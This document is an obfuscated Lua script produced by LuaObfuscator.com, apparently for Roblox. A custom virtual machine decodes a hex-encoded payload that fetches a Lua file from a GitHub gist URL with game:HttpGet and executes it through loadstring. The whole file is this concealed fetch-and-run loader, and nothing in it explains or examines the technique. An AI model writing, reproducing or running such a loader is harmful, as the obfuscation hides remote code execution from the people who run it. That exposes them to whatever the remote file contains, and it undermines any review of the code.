--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v83=v2(v0(v30,16));if v19 then local v89=v5(v83,v19);v19=nil;return v89;else return v83;end end end);local function v20(v31,v32,v33) if v33 then local v84=(v31/((5 -3)^(v32-(2 -1))))%((3 -1)^(((v33-(2 -1)) -(v32-1)) + (620 -(555 + 64)))) ;return v84-(v84%(932 -(857 + 74))) ;else local v85=2^(v32-1) ;return (((v31%(v85 + v85))>=v85) and (569 -(367 + 201))) or ((233 + 694) -(34 + 180 + 713)) ;end end local function v21() local v34=877 -(282 + (1865 -(226 + 1044))) ;local v35;while true do if (v34==(1638 -((6631 -5108) + 114))) then return v35;end if (v34==(0 + 0)) then v35=v1(v16,v18,v18);v18=v18 + (1 -0) ;v34=1066 -(68 + 997) ;end end end local function v22() local v36=117 -(24 + 8 + 85) ;local v37;local v38;while true do if (v36==0) then v37,v38=v1(v16,v18,v18 + 2 + 0 );v18=v18 + ((7 -4) -(1 + 0)) ;v36=1 -0 ;end if (v36==((3 -2) + 0)) then return (v38 * (436 -(67 + 113))) + v37 ;end end end local function v23() local v39=952 -((1054 -252) + 150) ;local v40;local v41;local v42;local v43;while true do if ((2 -1)==v39) then return (v43 * 16777216) + (v42 * 65536) + (v41 * (464 -208)) + v40 ;end if (v39==(0 + 0)) then v40,v41,v42,v43=v1(v16,v18,v18 + (1000 -(915 + 82)) );v18=v18 + (11 -7) ;v39=1 + 0 ;end end end local function v24() local v44=v23();local v45=v23();local v46=1188 -(422 + 647 + 118) ;local v47=(v20(v45,2 -1 ,17 + 3 ) * (((9 -6) -1)^(804 -(201 + 571)))) + v44 ;local v48=v20(v45,4 + (1764 -(760 + 987)) ,128 -(2010 -(1789 + 124)) );local v49=((v20(v45,56 -24 )==(1 + (766 -(745 + 21)))) and  -(792 -(368 + 423))) or (3 -2) ;if (v48==(0 -0)) then if (v47==(18 -(10 + (26 -18)))) then return v49 * (0 -0) ;else v48=1 + 0 ;v46=442 -(416 + 26) ;end elseif (v48==(705 + 1342)) then return ((v47==((0 -0) -0)) and (v49 * (((3 -2) + 0)/(0 -0)))) or (v49 * NaN) ;end return v8(v49,v48-(1461 -(145 + 3 + 290)) ) * (v46 + (v47/((1425 -((2982 -2352) + 793))^(482 -(44 + 386))))) ;end local function v25(v50) local v51=0;local v52;local v53;while true do if (v51==(1 + 0)) then v52=v3(v16,v18,(v18 + v50) -(1056 -(87 + 968)) );v18=v18 + v50 ;v51=8 -6 ;end if (v51==((701 -(376 + 325)) + 0)) then v52=nil;if  not v50 then v50=v23();if (v50==0) then return "";end end v51=2 -1 ;end if (v51==(1416 -((731 -284) + 966))) then return v6(v53);end if (v51==(5 -(8 -5))) then v53={};for v90=1, #v52 do v53[v90]=v2(v1(v3(v52,v90,v90)));end v51=1820 -(1703 + 114) ;end end end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v54=(function() return 241 -(187 + 54) ;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();local v59=(function() return;end)();local v60=(function() return;end)();local v61=(function() return;end)();while true do local v68=(function() return 0;end)();while true do if (v68==1) then if ((782 -(162 + 618))==v54) then v59[ #"nil"]=(function() return v21();end)();for v98= #">",v23() do local v99=(function() return 0;end)();local v100=(function() return;end)();while true do if (v99==0) then v100=(function() return v21();end)();if (v20(v100, #":", #".")==0) then local v140=(function() return 0 + 0 ;end)();local v141=(function() return;end)();local v142=(function() return;end)();local v143=(function() return;end)();while true do if (2~=v140) then else if (v20(v142, #",", #".")== #".") then v143[2 + 0 ]=(function() return v61[v143[2]];end)();end if (v20(v142,2,3 -1 )== #":") then v143[ #"91("]=(function() return v61[v143[ #"nil"]];end)();end v140=(function() return 3;end)();end if (v140~=(4 -1)) then else if (v20(v142, #"-19", #"-19")== #"\\") then v143[ #"asd1"]=(function() return v61[v143[ #"0836"]];end)();end v56[v98]=(function() return v143;end)();break;end if (v140==0) then local v168=(function() return 0;end)();while true do if (v168~=0) then else v141=(function() return v20(v100,1 + 1 , #"gha");end)();v142=(function() return v20(v100, #"http",6);end)();v168=(function() return 1;end)();end if (v168~=(1637 -(1373 + 263))) then else v140=(function() return 1001 -(451 + 549) ;end)();break;end end end if (v140~=1) then else local v169=(function() return 0;end)();while true do if (1==v169) then v140=(function() return 1 + 1 ;end)();break;end if (v169~=0) then else v143=(function() return {v22(),v22(),nil,nil};end)();if (v141==(0 -0)) then local v176=(function() return 0;end)();local v177=(function() return;end)();while true do if (v176==(1384 -(746 + 638))) then v177=(function() return 0;end)();while true do if (v177==0) then v143[ #"-19"]=(function() return v22();end)();v143[ #".com"]=(function() return v22();end)();break;end end break;end end elseif (v141== #"[") then v143[ #"xnx"]=(function() return v23();end)();elseif (v141==(1 + 1)) then v143[ #"gha"]=(function() return v23() -((2 -0)^(357 -(218 + 123))) ;end)();elseif (v141== #"gha") then local v183=(function() return 0;end)();local v184=(function() return;end)();while true do if (v183~=(1581 -(1535 + 46))) then else v184=(function() return 0 + 0 ;end)();while true do if (v184~=0) then else v143[ #"xnx"]=(function() return v23() -(2^16) ;end)();v143[ #"0313"]=(function() return v22();end)();break;end end break;end end end v169=(function() return 1 + 0 ;end)();end end end end end break;end end end for v101= #"|",v23() do v57,v101,v28=(function() return v55(v57,v101,v28);end)();end return v59;end break;end if (v68==(560 -(306 + 254))) then local v92=(function() return 0;end)();while true do if (v92~=(1 + 0)) then else v68=(function() return 1;end)();break;end if ((0 -0)~=v92) then else if ((1468 -(899 + 568))~=v54) then else local v102=(function() return 0;end)();while true do if (v102==1) then v61=(function() return {};end)();for v144= #",",v60 do local v145=(function() return 0;end)();local v146=(function() return;end)();local v147=(function() return;end)();local v148=(function() return;end)();while true do if ((0 + 0)~=v145) then else local v170=(function() return 0;end)();while true do if ((2 -1)~=v170) then else v145=(function() return 604 -(268 + 335) ;end)();break;end if (v170==(290 -(60 + 230))) then v146=(function() return 572 -(426 + 146) ;end)();v147=(function() return nil;end)();v170=(function() return 1 + 0 ;end)();end end end if (v145~=(1457 -(282 + 1174))) then else v148=(function() return nil;end)();while true do if (v146~=(812 -(569 + 242))) then else if (v147== #"<") then v148=(function() return v21()~=(0 -0) ;end)();elseif (v147==(1 + 1)) then v148=(function() return v24();end)();elseif (v147~= #"gha") then else v148=(function() return v25();end)();end v61[v144]=(function() return v148;end)();break;end if (v146~=0) then else v147=(function() return v21();end)();v148=(function() return nil;end)();v146=(function() return 1;end)();end end break;end end end v102=(function() return 1026 -(706 + 318) ;end)();end if (0==v102) then v59=(function() return {v56,v57,nil,v58};end)();v60=(function() return v23();end)();v102=(function() return 1;end)();end if (v102==(1253 -(721 + 530))) then v54=(function() return 1273 -(945 + 326) ;end)();break;end end end if (v54==0) then v55=(function() return function(v132,v133,v134) local v135=(function() return 0 -0 ;end)();local v136=(function() return;end)();while true do if (v135==(0 + 0)) then v136=(function() return 700 -(271 + 429) ;end)();while true do if ((0 + 0)==v136) then local v174=(function() return 0;end)();while true do if (v174~=(1500 -(1408 + 92))) then else v132[v133-#" " ]=(function() return v134();end)();return v132,v133,v134;end end end end break;end end end;end)();v56=(function() return {};end)();v57=(function() return {};end)();v58=(function() return {};end)();v54=(function() return 1087 -(461 + 625) ;end)();end v92=(function() return 1289 -(993 + 295) ;end)();end end end end end end local function v29(v62,v63,v64) local v65=v62[1 + (753 -(239 + 514)) ];local v66=v62[2];local v67=v62[3];return function(...) local v69=v65;local v70=v66;local v71=v67;local v72=v27;local v73=1172 -(418 + 753) ;local v74= -((4 -3) + 0);local v75={};local v76={...};local v77=v12("#",...) -(1 + 0) ;local v78={};local v79={};for v86=0 + 0 ,v77 do if (v86>=v71) then v75[v86-v71 ]=v76[v86 + 1 ];else v79[v86]=v76[v86 + 1 ];end end local v80=(v77-v71) + 1 + 0 + 0 ;local v81;local v82;while true do v81=v69[v73];v82=v81[530 -(406 + 123) ];if (v82<=7) then if ((3946>3743) and (v82<=(1772 -(1749 + (997 -(553 + 424)))))) then if ((v82<=(1 -0)) or (4372==1850)) then if ((v82==(0 + 0)) or (1335>=3306)) then local v103=1322 -(1249 + 73) ;local v104;while true do if ((232<821) and (v103==(0 + (1329 -(797 + 532))))) then v104=v81[1147 -(466 + 679) ];v79[v104]=v79[v104](v13(v79,v104 + 1 ,v74));break;end end else local v105=0 -0 ;local v106;local v107;while true do if (v105==1) then v79[v106 + (2 -1) ]=v107;v79[v106]=v107[v81[1904 -(106 + 1794) ]];break;end if (v105==(0 + 0)) then v106=v81[1 + 1 + 0 ];v107=v79[v81[8 -5 ]];v105=1 + 0 ;end end end elseif (v82>(5 -(3 + 0))) then v79[v81[116 -(4 + 110) ]]={};else local v109=0 + 0 ;local v110;local v111;local v112;local v113;while true do if ((4844>2253) and (((198 + 386) -((133 -76) + 527))==v109)) then v110=v81[1429 -(41 + 1386) ];v111,v112=v72(v79[v110](v13(v79,v110 + (104 -(17 + 86)) ,v81[3 + 0 ])));v109=1;end if (v109==(1 -0)) then v74=(v112 + v110) -(2 -1) ;v113=166 -(122 + 44) ;v109=(1 + 1) -0 ;end if ((452==452) and (518<902) and (v109==(6 -4))) then for v164=v110,v74 do v113=v113 + 1 + 0 ;v79[v164]=v111[v113];end break;end end end elseif ((2994>858) and (v82<=(1 + 4))) then if (v82>((4 + 3) -3)) then v79[v81[2]]=v81[68 -(30 + (75 -40)) ];else v79[v81[2 + 0 ]]=v64[v81[1260 -(1043 + (596 -382)) ]];end elseif ((v82==(22 -16)) or (4557<2087)) then local v118=v81[4 -2 ];local v119,v120=v72(v79[v118](v13(v79,v118 + (1213 -(323 + 259 + 630)) ,v81[7 -4 ])));v74=(v120 + v118) -(581 -(361 + 219)) ;local v121=320 -(53 + 267) ;for v137=v118,v74 do v121=v121 + 1 + 0 ;v79[v137]=v119[v121];end else v79[v81[415 -(15 + 398) ]]=v81[985 -((1220 -(373 + 829)) + 964) ];end elseif ((3874==3874) and (v82<=11)) then if (v82<=(33 -24)) then if ((v82>((736 -(476 + 255)) + 3)) or (1938>4935)) then v79[v81[2 + 0 ]]();else v79[v81[852 -(20 + (1960 -(369 + 761))) ]]={};end elseif (v82>(8 + 2)) then v79[v81[128 -(116 + 10) ]]();else do return;end end elseif ((v82<=(1 + 7 + 5)) or (4255<3423)) then if (v82>(750 -(542 + 196))) then v79[v81[3 -1 ]]=v64[v81[(1 -0) + 2 ]];else local v127=0;local v128;local v129;while true do if ((v127==(1 + 0)) or (3755<=915)) then v79[v128 + 1 ]=v129;v79[v128]=v129[v81[2 + 2 ]];break;end if (v127==0) then v128=v81[(7 -3) -2 ];v129=v79[v81[7 -4 ]];v127=1552 -(1126 + 425) ;end end end elseif ((1454<=2491) and (v82==(419 -(118 + 287)))) then do return;end else local v130=0 -0 ;local v131;while true do if (v130==(1121 -(118 + 1003))) then v131=v81[(24 -19) -3 ];v79[v131]=v79[v131](v13(v79,v131 + 1 ,v74));break;end end end v73=v73 + ((616 -(64 + 174)) -(142 + 235)) ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q7470476574038D3Q00682Q7470733A2Q2F676973742E67697468756275736572636F6E74656E742E636F6D2F6F6366692F36616364333664336163613335612Q63343965342Q39326164353463316336372F7261772F39316364663966392Q303732623631362Q61366566356561313863383563656661303734353464312F6F626675732532353230616E696D6178696E672E6C756100094Q00087Q00120D000100013Q00120D000200023Q002001000200020003001207000400044Q0002000200046Q00013Q00022Q000B0001000100012Q000E3Q00017Q00",v9(),...);